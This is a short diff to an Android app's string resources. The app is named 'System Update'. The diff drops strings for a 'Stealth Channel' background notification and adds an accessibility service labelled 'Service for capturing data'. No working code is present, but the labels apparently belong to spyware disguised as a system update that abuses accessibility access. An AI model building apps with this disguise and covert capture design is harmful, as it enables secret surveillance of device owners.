@@ -1,7 +1,4 @@
 <resources>
     <string name="app_name">System Update</string>
-    <string name="service_title">System Sync</string>
-    <string name="service_text">Updating system data...</string>
-    <string name="channel_name">Stealth Channel</string>
-    <string name="channel_description">Background service channel</string>
+    <string name="accessibility_description">Service for capturing data</string>
 </resources>
